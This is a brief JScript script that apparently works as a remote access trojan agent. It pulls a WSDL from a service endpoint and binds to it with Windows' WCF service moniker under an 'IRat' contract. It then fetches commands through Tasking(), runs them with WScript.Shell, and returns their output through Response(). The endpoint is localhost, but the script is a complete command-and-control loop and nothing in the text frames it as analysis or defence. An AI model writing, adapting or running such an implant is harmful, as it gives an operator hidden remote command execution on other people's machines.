var h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET","http://localhost:8080/hello.svc?wsdl",false);
h.Send();
var xmlDoc = h.ResponseText;
var y = GetObject("service4:address='http://localhost:8080/hello.svc',wsdl="+xmlDoc+" , binding='BasicHttpBinding_IRat' , bindingNamespace='http://tempuri.org/', contract='IRat', contractNamespace='http://tempuri.org/'");
var c = y.Tasking();
var so;
var r = new ActiveXObject("WScript.Shell").Exec(c);
while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
y.Response(so);
